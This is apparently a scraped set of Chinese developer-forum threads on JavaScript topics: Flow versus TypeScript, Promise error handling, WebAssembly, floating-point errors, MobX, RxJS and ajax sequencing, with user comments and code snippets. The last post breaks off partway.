{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>javascript 不是强类型导致会常有些输入错误导致的 bug ，想加上强类型，用 flow 还是 typescript 呢？</p>\n</div></div>"], "reply": "21", "tittle": "flow 还是 typescript？", "comment": ["TypeScript 挺好用", "用 TypeScript ，如果需要对 SQL 查询做强类型，另做推荐 ", "当然 typescript 啦.", "TypeScript", "一年前的答案可能不是 TypeScript ，目前大家都已经接受并使用了", "\r", "自己看\r", "并不是 TypeScript 就一定好", "水平高自然用可定制的 flow ，多人协作用 ts ，一人主导且有一定造诣用 flow", "TypeScript", " 这个比较已经老了 ts 已经支持 null 检查 很好用", "lz 只要考虑一点 就是 ts 编译大项目的时间", "看了大家的回复我就放心了。", "Vue 用的是 flow", "确切的说 typescript 和 flowtype 都是给 js 编译阶段加了静态类型检查的功能，仍然是弱类型。\r", "\r", "个人觉得 ts 用起来不错， v2.1 后跟项目中已有 js 代码一起用更加方便。", "scala.js", "TypeScript\r", "Flow bug 太多了……", "typescript 有 vscode 效果加成", "Vue 2.0 为什么选用 Flow 进行静态代码检查而不是直接使用 TypeScript ？\r", "typescript", " 嗯， 2.0 要用 --strictNullChecks 开启", "再仔细看了看问题，输入错误导致的 bug 不一定就是语言的问题，我更建议题主好好写代码而不是祈求工具给你检查赋值错误。毕竟 js 不是 java 不是 c 。", "团队用的话 TS 不错的，多人协作能力很好。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>网上没找到很有收获的文章, 所以自己总结了一下:</p>\n<h2>错误的抛出, 两种方法</h2>\n<ol>\n<li><code>reject()</code></li>\n<li><code>throw</code></li>\n</ol>\n<p>两种方法效果基本是等同的, 区别在于 reject() 不会终止函数的执行.</p>\n<p>只有最先抛出的错误会被捕获.\n比如先 <code>reject()</code> 一个错误, 再 <code>throw</code> 第二个错误, 捕获到的是第一个错误, 但第二个抛出的错误也会被执行, 不过只有终止函数的作用了, 相当于 <code>return</code>.</p>\n<p>网上有人建议不要使用 <code>throw</code> 抛出错误, 因为 throw 并不会更改 promise 的状态, 而且容易和系统抛出的其他异常混淆. 我认为这个建议值得继续探讨而不是下定论, 首先, promise 的状态并不能直接监控, 其次抛出什么错误我们完全可以扩展 Error 而区分错误类型.</p>\n<p>我的建议是没有对错, 分具体情况使用就好.</p>\n<p><code>reject()</code> 的优点, 不影响函数继续执行, 没有 <code>throw</code> 的作用域限制.</p>\n<p><code>throw</code> 的优点, 不需要在 Promise 中, 在 <code>then()</code> 中的普通函数中也能抛出错误.</p>\n<h2>错误的捕获, 两种方法</h2>\n<p>Promise 内部抛出的错误是无法被外部的 try...catch 捕获的, 因为作用域问题.</p>\n<ol>\n<li><code>then()</code> 的第二个参数</li>\n<li><code>catch()</code> 的第一个参数</li>\n</ol>\n<p>错误的处理都是调用一个函数 (onRejected), 传入一个参数, 这个参数即为刚才抛出的错误.</p>\n<p>错误只会被捕获一次. 且如果错误被捕获, 则之后的 <code>then()</code> 都会被执行, 即使不拥有正常的返回值作为参数. 因此建议链式调用最末端再捕获错误.</p>\n<p>这两种方法没有什么区别, 无论是如何抛出错误, 都能被正常捕获.</p>\n<hr>\n<p>注: 使用的是 <a href=\"https://github.com/taylorhakes/promise-polyfill\" rel=\"nofollow\">https://github.com/taylorhakes/promise-polyfill</a></p>\n<p>原文: <a href=\"https://github.com/zsqk/zsqk/issues/51\" rel=\"nofollow\">https://github.com/zsqk/zsqk/issues/51</a></p>\n</div></div>"], "reply": "15", "tittle": "Promise 的错误处理", "comment": ["> 因为 throw 并不会更改 promise 的状态\r", "\r", "这句话是啥意思，我测试好像是会改状态的。", "感觉楼主基本没理解到点子上", "throw 和 reject 理解错了， promise 会隐式对 throw 的错误 try catch 后 reject 掉", " 之前写过一篇总结，觉得可以帮你理清一下思路。 ", " ？", " 前面的话是 \"网上有人建议\". 我觉得不太合适.", " 我只是用, 还没看过 polyfill 具体实现的代码. 我觉得我说的和 \"promise 会隐式对 throw 的错误 try catch 后 reject 掉\" 没有冲突.\r", "\r", "代码例子:\r", "```\r", "// 适合使用 reject()\r", "new Promise((resolve, reject) => {\r", "  someFunc({\r", "    cb() {\r", "      reject()\r", "    }\r", "  })\r", "}).catch(eh)\r", "\r", "// 适合使用 throw\r", "new Promise(resolve => {\r", "  resolve(data)\r", "}).then(data => {\r", "  const res = handle(data)\r", "  if (!res) {\r", "    throw new Error('error')\r", "  }\r", "}).catch(eh)\r", "```", " ... 我自己还觉得没问题. 请教槽点.", " 你文章并没有纠正这个说法。。\r", "\r", "还有你表述的更多的是一些使用习惯。", " 先说 throw 的优点，其实并不是在 promise 中的特性，而是 throw 本身的特性，而在一般使用中 return reject() 伴随着使用，常用场景就是遇到错误不继续执行，而 下面说的 在 then 中，同样可以使用 return Promise.reject() 达到 throw 同样的效果，所以结论就是这两种使用起来基本没有区别，可以互相替换着", " 少补充一点， throw 只能在同步场景中使用， reject 可以用于异步，可能就是两个的区别吧", " 首先可以去看看 promise/A+的全文，创建 promise 的方法也好，.catch 也好都不在标准范围内。 throw 和 reject 行为的差异也好， catch 后的 then 为什么继续运行也好，都在标准里有，虽然有点拗口 /晦涩，但却是直指核心的\r", "\r", "如果你理解了的话就不会用”捕获错误“这样的描述来讲这个问题了\r", "\r", "另外作为练习，建议你想想怎么用 promise 来完成一次递归。就比如说远程的分页拉信息的 api 如果不会返回总条数 /页数，只通过返回空列表标志列表结束，如何用返回 promise 的方法 getList(pageNo)来说构造一个拉完整列表的 getWholeList()，在第 n 页出错的时候用{currentPage:n, error:e}结构来 reject 你返回的 promise 对象", " 我写的都是使用经验, 没有看标准的定义.\r", "\r", "ECMA 262 6th Promise Abstract Operations, Promise Jobs 让我感觉似懂非懂. 因为标准中有许多关联, 要把关联搞懂才能更好地继续阅读, 比如 Record, Reaction, Job 等等.\r", "\r", "关于错误这块儿, throw 好像是 PromiseReaction[[Handler]] is \"Thrower\", handlerResult be Completion, 正常应该是 handlerResult be Call. 但我不确定我看懂了...\r", "\r", "就我目前来说, 还是使用吧, 依靠经验...", " 做了一下练习题, 感觉实现了功能, 但没发现自己存在的问题...\r", "\r", "```\r", "const api = (num) => {\r", "  const allNum = 10;\r", "  return new Promise(resolve => {\r", "    setTimeout(() => {\r", "      if (num <= allNum) {\r", "        resolve([num])\r", "      } else {\r", "        resolve(false)\r", "      }\r", "    }, 100)\r", "  })\r", "}\r", "\r", "const getList = (num = 1) => {\r", "  return new Promise((resolve, reject) => {\r", "    api(num).then(res => {\r", "      if (res) {\r", "        resolve(res);\r", "      } else {\r", "        reject({\r", "          currentPage: num,\r", "          error: {\r", "            code: 9876,\r", "            message: 'can not find the page.'\r", "          }\r", "        });\r", "      }\r", "    })\r", "  })\r", "}\r", "\r", "const getWholeList = (num = 1, list = []) => {\r", "  return new Promise(resolve => {\r", "    getList(num).then(res => {\r", "      resolve(getWholeList(num + 1, [...list, ...res]))\r", "    }).catch(e => {\r", "      if (e.error.code === 9876) {\r", "        resolve(list)\r", "      }\r", "    })\r", "  })\r", "}\r", "\r", "getWholeList().then(res => {\r", "  console.log('完成', res)\r", "})\r", "```", " 错误逻辑有点乱，且只处理了预料中的异常，另外， promise 的生成应该只出现一次就够了，在 new Promise 里面嵌套其他拿 Promise 的方法是典型的反 Promise 模式"]},
{"content": ["<div class=\"topic_content\">老方法是改 charset （ <a target=\"_blank\" href=\"http://web.archive.org/web/20080821092906/http://mgran.blogspot.com/2006/08/downloading-binary-streams-with.html\" rel=\"nofollow\">http://web.archive.org/web/20080821092906/http://mgran.blogspot.com/2006/08/downloading-binary-streams-with.html</a> ），新方法是改 responseType ，新方法性能好，语义清晰，然而我还是使用老方法，因为老方法在正文接收完全前可以读取正文，做到流式加载，而新方法不行~</div>", "<div class=\"topic_content\">刚刚找到了 ReadStream API ，这个问题解决了</div>"], "reply": "4", "tittle": "今天突然有了用 xhr 处理二进制的需求", "comment": ["那么问题来了，怎么覆盖 BOM ？", "xhr 里有这个 API ？还是指的是 fetch API 里的 ReadableStream ？", " 指的是 fetch ，不过好像哪里不对", " fetch 不能及时 abort ， stream 的粒度也难以控制，连 nightly 都不支持。我现在想到的迂回办法是仍然使用 xhr ，如果检测到 charset 不再是 x-user-defined ，就 abort 当前连接，使用 Range 标头错开一字节重新发起请求，再在单独的连接中使用 responseType 为 arraybuffer 的请求补上错开的那个字节"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家维护一个前端工作流常用插件列表吧。</p>\n<blockquote>\n<p><a href=\"https://github.com/Xheldon/I_love_this_plugin/tree/develop\" rel=\"nofollow\"><code>I_love_this_plugin</code></a></p>\n</blockquote>\n<p>按照已有示例提交 PR 。</p>\n<p>不管怎样，我会一直在工作中更新的，欢迎常来看看。</p>\n<p>水平有限， thanks in advance 。</p>\n<p>求 Star ，求 PR 。</p>\n<p>轻喷。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "一起维护一个前端工作流常用插件列表吧", "comment": []},
{"content": "", "reply": "1", "tittle": "织梦使用 cksource 插件实现多图片上传，具体怎么操作有人知道吗", "comment": ["那玩意儿还有人用呢？\r", "可是你肯定问错地方了\r", "V 站会喷死你"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本周发布的 <a href=\"http://www.solidot.org/story?sid=51660\" rel=\"nofollow\">Firefox 52</a> 加入了对 WebAssembly 的支持</p>\n<p><em>JavaScript 精粹</em>提到：大多数编程语言都有精华和糟粕， JavaScript 中的糟粕的比重超出了预料。</p>\n<p>虽然很多人不大愿意写 JavaSript ，但是 JavaScript 作为 Web 的'标准语'又无法避开。于是几乎所有主流的通用语言都可以编译成 JavaScript ， Babel 也成为非常流行的编译器</p>\n<p>面对 Web 开发中的混乱，程序员们想出了很多方法，比如</p>\n<ul>\n<li>jQuery.js 、 Backbone.js 、 Require.js ：添加一个小的 runtime ，增强 JavaScript 与其宿主</li>\n<li>gulp.js 、 webpack 、 JSLint 等：完善前端开发工具链</li>\n<li>TypeScript 、 ECMAScript 、 CoffeeScript 等、：更好的 JavaScript</li>\n<li><strong>asm.js 、 WebAssembly ：制定 Web 中间码，让 JavaScript 成为一种可选的技术</strong></li>\n</ul>\n<p>不用写 JavaScript ，你们高兴吗？</p>\n</div></div>"], "reply": "34", "tittle": "JavaScript 的 WebAssembly 正逐渐走向主流", "comment": ["请先装工具链……\r", "而且你装的时候，可能会遇到假的安装教程或安装包，一直报错。", "现在有什么语言支持 WebAssembly 了吗?", "去年接触过一段 asm.js ，后面放弃了，使用上不习惯， webassembly 看了下，发现更加不习惯额", "我们假设下一代 javascript 的速度是现在的十倍， web 有什么变化？", "对对对，你说的都对。 Javascirpt 最好了。", "目前支持编译到 WASM 的有： C/C++/RUST\r", "等下一个版本支持 GC 和 DOM/API 的时候，就可以入坑完全弃掉 JS 了。", "也许到 JS 变成可选项的时候，大家才会发现 JS 的优秀吧。", " #6 原来 API 是 WebAssembly 实现的啊，我还以为需要各语言自己实现呢。", "会不会成为下一个 Applet ， Silverlight 或者  Flash ？", "小程序没出来的时候也被捧上天", "卧槽，感觉要失业了", " API 和 DOM 一样，都是现有的，并非 WASM 再造一个 API 。跟 JS 一样， WASM 可直接引用。", "想多了 flash 和 html5 现在别说半壁江山了 估计 flash 都是 6\r", "至于什么 webasm 都没谱。。", "不过 webasm 的意义，就是 10 年后谁再跟你说 java 和 javascript 没关系你可以抽他脸，到时候你能自豪的说你写的是 JAVAscript 不是 javascript", " 叫 java.js 吧", "每天醒来都有新的 X.js 正在成为主流，切实感受到了大家为了避免混乱所付出的巨大努力。", "感觉写 js 真辛苦", "写着写着也就习惯了，其实我只是单纯喜欢码字和解决问题。", " 那拿 node 跑就比 c 语言快了 你说啥变化……", "很多人讨论偏离了 WASM 的初衷，它主要是为了解决性能问题，其它语言转过来只是顺便可以这样做而已，而且转换的过程都是靠工具链，也不会真的让你去写什么恐怖的代码，只是限制了些语法而已", "简单说，如果应用中一些关键点有性能问题，或者其它语言有更好的实现，那么 WASM 显然就很合适做这个事了，但是你好好的一个 Web 应用，大多数时候是用不到这个的，反而一样新出的的 Service Worker 就更接近普通人了", " 这东西是 web 端啊。因为浏览器上只能跑 js ，所以这东西出来才那么多人觉得有意思。再接着你说的问题，服务器上不止 node 一个选择，为啥那么多人选 node 呢？\r", "说到底，语言跑得快或慢，真的那么重要吗？绝大多数场景下的性能瓶颈都不在语言那吧。", " [TypeScript 、 ECMAScript 、 CoffeeScript 等、：更好的 JavaScript] \r", "你知道 ECMAScript 是什么吗？", "个人认为还早。\r", "\r", "WebAssembly 虽然现在已经完成第一阶段开发，但如果编译到 js ，体积膨胀太大，一个简单的 int add(int ,int); 开 O3 都能达到 400kb 左右，别提更复杂的 c/c++代码，当然随着源码体积的增大，编译产生的副产物大小影响会减小，但体积确实是编译到 js 的一个大问题。如果编译到 wasm ，目前只支持 int,float 等四种简单的数据类型，指针等目前还都不支持，可用性大大受限，但是它解决了编译尺寸问题。\r", "\r", "所以目前 WebAssembly 具有可用性的地方只有游戏，视频这些对文件尺寸不敏感，性能要求高的场景，想要全方位替代 js 还早。", " 我只是根据你假设的那句话来的啊 如果硬件不变的前提下 js 快了 10 倍 说明已经变的跟 c 很像了啊", " 游戏有 unity ，有 cocos ，有 cryengine ，有 unreal ，各家都是先出产品再给钱的策略\r", "不知道 h5 以及相关技术有什么竞争力 你说的是微信里的小游戏么。。\r", "\r", "我玩的最好玩的 h5 游戏是钦定的小鸟", " 浏览器就老实做浏览器的事， java 和 c++的性能和场景都讨论了这么多年了，想要性能 c++、汇编走起\r", "\r", "总有一些前端想妄想一统江山，用 c++写 web 的又不是没有， hadoop java 的也有公司用 c++重构， js 以及 js 衍生物咋就那么香呢", " 我知道 es 是什么，我这里把 es 与 js 分开说主要是为了区分标准与实现\r", "es 也作出过一些努力，比如'use strict'。但是标准仅仅是标准，只是一个建议， js 的实现掌控在大厂手里", " #28 但你这么说，很容易让人产生误解。\r", "`JavaScript 中的糟粕的比重超出了预料`，这其中的糟粕，其实都是 ECMAScript 标准定义而产生的，所以把 ECMAScript 放到`better JavaScript`中去未免有些牵强", " '都是 ECMAScript 标准定义而产生的'，这句话不对", " 我指的是网页上的游戏", " 不要拿小程序跟这个比，完全两个不一样的东西", " #32 哟，急了~", "首先受益的应该是 webgl"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://i.imgur.com/mzGXjeB.png\"><img src=\"http://i.imgur.com/mzGXjeB.png\" class=\"embedded_image\"></a><br>\r<br>-------------------------\r<br>\r<br>更新：感谢1楼的指点，改成了这样：(123*100+Math.floor(123*0.008*100)+10*100)/100=133.98，不知有没有更好的方法？\r<br>\r<br>PS: 为什么markdown模式显示不出星号？</div>"], "reply": "16", "tittle": "javascript 计算 123+Math.floor(123*0.008*100)/100+10 为什么等于 133.98000000000002 ?", "comment": ["典型的浮点数问题", "0.1+0.2!=0.3 ，浮点数无解。只能想办法减少误差", "这个礼拜的第二回了：\r", "\r", " 这域名 666", "r#3 @", " 这域名哈哈哈哈哈哈哈哈哈哈哈哈", "不用那么长，我也来个短的 0.58*100", "建议楼主去学习一下计算机组成原理(", "一大谜团 - 为啥楼主不用 append 也能编辑帖子？", "keyword: IEEE 754 浮点数计算", "\r", "\r", "然后你可以试一下\r", "Math.round10(123+Math.floor(123*0.008*100)/100+10, -10)", "看我以前写的一篇文章：\r", " \r", "Mozilla 这个还只是一半，负数部分得自己写，因为 js 的 Math.Round()总是向正无穷大取整：\r", "If the fractional portion is exactly 0.5, the argument is rounded to the next integer in the direction of +∞\r", "\r", "比如 Math.round10(-1.005,-2)的结果是 -1 而不是 -1.01", " 我没记错的话，短时间内能编辑的，", " 这个网站，的确非常的有意思。", "世界的错", "![]( ", " )"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不用自己假设服务器的。\n手机 web 调试真是麻烦</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "有没有国内能用的，类似 ", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在公司写了好多次抽奖活动 , 现在终于用 vue 封装成组件了</p>\n<p>加入到自己的 ui 库</p>\n<h1>github</h1>\n<p><a href=\"https://github.com/jlianphoto/iver/blob/master/src/packages/lottery/src/lottery.vue\" rel=\"nofollow\">https://github.com/jlianphoto/iver/blob/master/src/packages/lottery/src/lottery.vue</a></p>\n<h1>docs</h1>\n<p><a href=\"https://jlianphoto.github.io/iver/#/?id=lottery\" rel=\"nofollow\">https://jlianphoto.github.io/iver/#/?id=lottery</a></p>\n<h1>demo</h1>\n<p><img alt=\"demo\" src=\"http://qr.api.cli.im/qr?data=http%253A%252F%252Fiver.jlianphoto.com%252F%2523%252Fdemo%252Flottery&amp;level=H&amp;transparent=false&amp;bgcolor=%23ffffff&amp;forecolor=%23000000&amp;blockpixel=12&amp;marginblock=1&amp;logourl=&amp;size=280&amp;kid=cliim&amp;key=029106624145f70372f668f14ff31a38\"></p>\n</div></div>"], "reply": "3", "tittle": "用 vue 重写了九宫格抽奖", "comment": ["哈哈哈哈，为啥怎么玩都是 0.5 红包", "厉害(ง •̀_•́)ง", " 可以在 beforeLottery 函数里面随机生成 一个 0-8 的数字 ,然后赋值到 this.prize , 就是随机了。现在 demo 里的 prize 是 1"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>if(typeof(ad)=='undefined' || typeof(ads)=='undefined' || typeof(dzad)=='undefined' || typeof(dzads)=='undefined'){\nalert('本站开启了反广告拦截功能，滥用广告拦截会影响本站收入以及您的浏览体验，建议关闭广告拦截！开启广告，页面已不会抖动');</p>\n<p>}\n这是在 index 页面加载的</p>\n</div></div>"], "reply": "9", "tittle": "暴力猴脚本&ublock 能不能屏蔽这样的反广告拦截功能？", "comment": ["var ad = 1;\r", "var ads =1;\r", "var dzad =1;\r", "var dzads =1;", "放个链接吧…", "r#2 @", " 这个论坛也是反广告拦截的，看看有办法吗？多谢 ", "反拦截会二次检测的吗？不会的话在页面全部加载完毕时才删除呗", "同意四楼，自己用 ublock 选择区域拦截，广告会加载，但广告板块瞬间就被移除。", " ", "r#6 @", " 可用，多谢！", "\r", "\r", "这个支持屏蔽内嵌 js ，支持向网站插入 js 、 css 。\r", "感觉这样不存在无法屏蔽的反广告了。", " 〣( ºΔº )〣 ac 〣( ºΔº )⊙▽⊙〣 k"]},
{"content": ["<div class=\"topic_content\">直接 copy 的官方 demo 数据,改了几个数据成中文:\r<br><img src=\"http://ww2.sinaimg.cn/large/e83497fcgy1fdp4exqfwwj219h0bbabk.jpg\" class=\"embedded_image\"> \r<br>\r<br>如果进行排序:\r<br><img src=\"http://ww2.sinaimg.cn/large/e83497fcgy1fdp4gd8ze3j218f09cgn0.jpg\" class=\"embedded_image\"> \r<br>\r<br>数据就全乱了,如果是全英文情况下,不管怎么排序都是正常的\r<br>\r<br>大家有没有遇到过这个问题,如何解决的呢? 还发现一点,如果数据不是通过 ajax 加载出来,而是一个数组变量的话 也是正常的</div>"], "reply": "目前尚无回", "tittle": "jqgrid 表格组件进行分组时，如表格数据中有中文则分类不准确的 bug？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>类似的极验证，点触免费的都有限制， google 在国内又没办法用。</p>\n</div></div>"], "reply": "9", "tittle": "有哪些开源的点击或拖动验证码", "comment": ["没有", "从原理上来讲，拖动和点击验证都不靠谱，都是能被破解的", " #2 你说，从原理上来说，哪些是不能破解的呢？\r", "\r", "验证码只是加大了自动化的工作难度，并不能完全避免", " +1", " 拖动和点击以及图片验证码的本质不同，在于前者是行为识别，后者是智能（我也不知道该用什么词）识别，而我认为行为识别的话只要有一个能轻易看懂（开源）的代码，那么一定可以伪造对应的行为。 Google 那个，没人能看懂他的源码（并且部分判断在服务器），所以没办法。", " #5 “破解” Google reCAPTCHA 就要看看这个视频了 ", " 惊呆 世上竟有如此精妙的验证码破解方法", " 后者是根据数据分析的，包括 ip ，验证次数，鼠标轨迹（据说），浏览器等等等等", " 前端是可信的就行了, 不管操作者是谁"]},
{"content": "", "reply": "目前尚无回", "tittle": "我应该在多大程度上依赖 JS 引擎的优化机制？", "comment": []},
{"content": ["<div class=\"topic_content\">有人向我推荐, 可我觉得这东西我用不着, Promise 足以.\r<br>\r<br>看了 <div class=\"embedded_video_wrapper\"><iframe id=\"ytplayer\" type=\"text/html\" class=\"embedded_video\" src=\"//www.youtube.com/embed/AslncyG8whg\" frameborder=\"0\" allowfullscreen></iframe></div> 推荐 RxJS, 说了 Promise 的两个问题, 不可中断与单值传递.\r<br>\r<br>我目前还没觉得这是 Promise 的问题.\r<br>\r<br>我目前对 RxJS 有些抵触的原因是, 我觉得只有当我遇到痛点时才会想办法解决, 如果提前引入一些东西我也不会深刻理解为什么要这样做, 然后也用不好反而拖累项目.\r<br>\r<br>请带着原因批评我, 谢谢.</div>"], "reply": "13", "tittle": "还没有开始使用 RxJS 的人想要知道它在使用中的优缺点和项目适用性", "comment": ["我自己的体会是需要 push 数据时特别方便。可以代替 EventEmitter 。\r", "\r", "可以先开个小项目试用一下再决定。也许你真的不需要。", "前些天一直在学 Rx ，想引入项目后面还是放弃了。\r", "目前看来 Rx 适合复杂的异步时间和数据流等，简单的小场景用 Rx 只是自己给自己找麻烦。而且 Rx 的侵入性特别强，基本上用了之后都是 Rx 那一套东西了。\r", "\r", "最后贴一句前两天自己看到的一句话：不要为了 Rx 而 Rx 。", "视频中也说到了 RxJS 是有一点学习曲线的.\r", "\r", "Ben Lesh 谈 redux-observable, 说受到了 redux-thunk 的启发 (is inspired by redux-thunk).\r", "\r", "\r", "\r", "\r", "redux-saga 在 npm 目前的下载量五倍于 redux-observable", "你有好几个异步数据流吗？你需要对这好几个数据流进行合并等高级操作吗？\r", "没有就别上 rx", "可以看看 rxjs 内的 Subject 对象（继承自 Observable ）， new 出一个 Subject 对象后，多个源可以向这个 subject 发消息，也可以有多个源来订阅消息，这是轻量的订阅发布模式（虽然自定义事件也可以做到）， subject 支持大量的操作（ filter 、 map 、 buffer 、延迟等）来方便处理复杂业务，简单业务确实不太需要 rxjs 。", "个人看法，框架与库是解决问题，不是预防问题。当项目里的一些东西复杂到无法靠人力维护的时候，应该考虑引入相应的框架与库了。", "Rx 不是看两天就看明白的，学习曲线比跨语言还陡。", " \r", "试试这个人的另外一个库, kill redux", "这视频有人做了个内容介绍... ", " \r", "最近 reactive 热度很高, rxjs 作为学习方向挺好的, 目前 react 项目暂时不打算用... 或许以后 node server 会考虑\r", "另外我第一眼看 mobx 时, 觉得这货和 rxjs 蛮像的(作者还写了篇 issue 介绍二者区别)", "技术选型要看项目……", "单值传递不是问题，传 Array 就好了。\r", "不可中断不是问题，造个可中断的轮子代替 Promise 用就好了，比如我模仿 golang 写一个 ", " 。", "我之前有个用 node 写的爬虫项目，里头用的 rx 。项目需要对 4 个网站的某个资源前 5 页的结果进行抓取。我用 rx 实现每次对一个网站的 5 页做平行请求，每个请求如果失败就重试，重试 3 次之后再放弃。完成一个网站 5 页抓取之后再进行下一个网站 5 页内容的抓取，最后收集结果保存。\r", "这种需要对流进行复杂操作的场景，自己写就太困难了，靠 rx 就非常容易。\r", "如果是做前端 ui 的话，需要 rx 的场景实在太少。硬上 rx 只是增加一层抽象，给自己添乱。", "Angular 中默认使用 RxJS 了,但觉的还是得看具体项目,\r", "杀鸡焉用牛刀..."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>数学不好，什么高阶函数，函式编程都看得糊里糊涂的。\n幸亏出了一个 mobx 。\n看了一下好像教程还是比较小众，于是把学习经过记录下来\n传送门:<a href=\"https://www.haodan123.com/article/7\" rel=\"nofollow\">https://www.haodan123.com/article/7</a></p>\n</div></div>"], "reply": "36", "tittle": "mobx 用起来炒鸡爽～听说你们还在用 redux，", "comment": ["又双叒叕发明了一个状态管理的，好累", "一不小心, 我又落伍了.", "搞前端的整天以创造轮子为乐。", " 不搞轮子怎么升职，怎么加薪～～哈哈哈", "写的不错，打算也研究一下 Mobx", "最终把 react 变成了 vue o.o", "为什么滚动条在文章的右侧，不是整个页面的右侧？", "围观", "用了 mobx 为啥不直接 vue 。函数式本来就是 react 特色…", " 选择最适合你的技术，而不应该给技术捆绑", " 个人喜好，模仿我挺喜欢的谷歌的一款产品", " 什么用着顺手用什么", "我也搞了个前端状态机库啊： ", "blackbox 的东西有点多，上手初期容易踩坑\r", "习惯了很爽", "果然又来了几个职业学校 Java 培训出来的后端", "啥，我 redux 还没用熟又来一个，搞不懂你们前端(￣▽￣)\"", " redux 的学习曲线太……现在有个不错的选择", "不知道坑多不多╮(╯▽╰)╭", " 不过，用起来很方便", "准备试下...", "开心就好。。", "redux 不难用吧？", "> 其中 action 包装用法只能在 strict 模式下使用，请记得在你的 javascript 文件头写上：'use strict'。\r", "\r", "一句话说错了两个点，文档原话： Note: using action is mandatory when strict mode is enabled, see useStrict.\r", "意思是 action 在 strict 模式下改变任何 store 状态必须要使用 action 封装，而不使用 strict 模式可以不使用 action ，另外这里的 strict 模式指的的 mobx 的 stict 模式 ", " 更 javascript 的 strict 没有任何关系。", "elm", " get~我可能看的是盗版的文档～哈哈哈，看到 strict mode 就联想到 strict 去了。", "讲道理，函数式编程真的会让人头大，我可能长了假脑子_(:з」∠)_", "redux 其实原理简单，就是架构难", "用 mobx 一年多，真的是比 redux 写起来快太多……", "可能我对 MobX 了解不够多, 相较我还是偏爱 redux\r", "\r", "提几个初学者的问题~\r", "1. MobX 能 observable 各种各样结构的东西, 项目中把一个 string 或 number 作为观察对象是推荐的么, 团队要如何去约束 model 层的规范呢? (没有找到类似最佳实践的东西...)\r", "\r", "2. 对于内部无法观察(用 observer 装饰)的第三方组件, 如果传入的 props 是一个 object, 那么第三方组件是不响应观察对象变化的, 如何方便的在 review or eslint 时筛选出这类的问题", "为何不直接使用 vue 呢？", " 自己熟练哪个就选着哪个就好。没必要看到技术概念差不多的就来一句为啥不用 XX 。", "赞，同不想学 redux", "  model 层更加接近以前后端开发的形式", "setState fuck the world", " 本身 react+mobx 之后就是一个重型的 vue 吧 并不仅是概念一致，连底层实现都是用 getter/setter 的吧。。。", "其实就是一个 react 版的 vuex ，我先学的 vue 全家桶，后来发现 vue 太麻烦了，每次开发都要浏览器打开文档，对着看，最近在学 react ， react 看完了， router 看完了， redux 刚开始看的时候感觉很麻烦，估计说 react 全家桶曲线高就是 redux 吧，看了下 mobx ，和用过的 vuex 神似。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>非前端，轻吐槽- -</p>\n<p>自己做 spa 弄的，想要先判断是不是登录，如果登录的话，再去加载别的信息。</p>\n<p>以下是示例，效果就是先获取 session ，如果登录的话，再运行 callback 。</p>\n<pre><code>$.get('/session', (data)=&gt;{\n\tif(data.login) loading.done('login');\n}\n\n//然后在别的文件里\nloading.run_after(callback, 'login');\n</code></pre>\n<p>callback 会在 login 后才执行，第二个参数也可以是 Array</p>\n<p>不知会不会有用，本体很短，<a href=\"https://github.com/XUJINKAI/DuoBlog/blob/master/html-manage/src/API/loading.js\" rel=\"nofollow\">地址在这里</a> （忽略这个仓库，还没做完...）</p>\n</div></div>"], "reply": "12", "tittle": "JS 如何保证 ajax 顺序，写了个小东西", "comment": ["我觉得你直接回掉就好。\r", "\r", "如果你觉得不优雅可以看看 Promise.", "楼主看过 async.js 吗？", "目测楼主用的是 jquery ，你可以试试这样\r", "\r", "```js\r", "function fetchSession() {\r", "\t// 防止多次请求\r", "\tif(window.SESSION) return $.when(window.SESSION)\r", "\r", "\treturn $.get('/session', (data) => {\r", "\t\twindow.SESSION = data.login\r", "\t\treturn data.login\r", "\t}\r", "}\r", "\r", "fetchSession().then( data => {\r", "\t// do sth\r", "})\r", "\r", "\r", "fetchSession().then( data => {\r", "\t// do sth2\r", "})\r", "```", "挺不错的小轮子。不过 loading.run_after 的两个参数如果对调的话应该会更好看。\r", "\r", "当然了，从实用和工程的角度来说，还是看看 Promise 比较好……", "恩，对我这个程序写着玩的销售很有用。\r", "\r", "感谢分享！", " 你的名字\r", " 感谢分享\r", " 没...去看看\r", " @", " \r", "我知道 promise ，不过 promise 得把函数都改造成 promise 吧，而且链式调用都得写一起，就造了这个，作为小项目，啥都不用改，直接传函数就行。", "完全不用改别的地方。就你这个需求而言，可以直接用 promise 写好，和你的几乎等价：\r", "\r", "Promise 并不一定要求你在所有地方都用 Promise ，这是一个误解。\r", "\r", "你可以把 Promise 和回调等异步手段混用，没有任何问题。只是从实践角度而言，不推荐这么写（主要是维护起来很乱）。\r", "\r", "作为小项目，更应该尝试使用新鲜有趣的设计、保持快速迭代。", " 学习了 非常感谢", "建议看看\"你不知道的 javascript\"中卷", "有些顺序也可以巧妙的通过 js 单线程模型实现", "LABjs"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>github 源码： <a href=\"https://github.com/Detachment/Build-vue-hackernews-2.0-from-scratch\" rel=\"nofollow\">Bulid vue-hackernews-2.0 from Scratch</a><br>\n个人博客：<a href=\"http://detachment.club/2017/03/11/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%9E%84%E5%BB%BA%20Vue-HackerNews-2.0%20%E9%A1%B9%E7%9B%AE/\" rel=\"nofollow\">从零开始搭建 《 vue-hackernews-2.0 》</a></p>\n<hr>\n<h2>前言</h2>\n<p>欢迎大家来到我的第一个程序搭建教程: <strong>从零开始搭建 《 vue-hackernews-2.0 》</strong>。</p>\n<p>作为一个前端开发的初学者，在接触学习到 Vue.js 的时候，我发现官方提供并极力推荐的项目《 vue-hackernews-2.0 》对于新手而言比较难理解。但同时我又被这种高度工业化的项目所吸引，所以我决定花一段时间来弄清楚这个项目到底是怎么运行起来的。 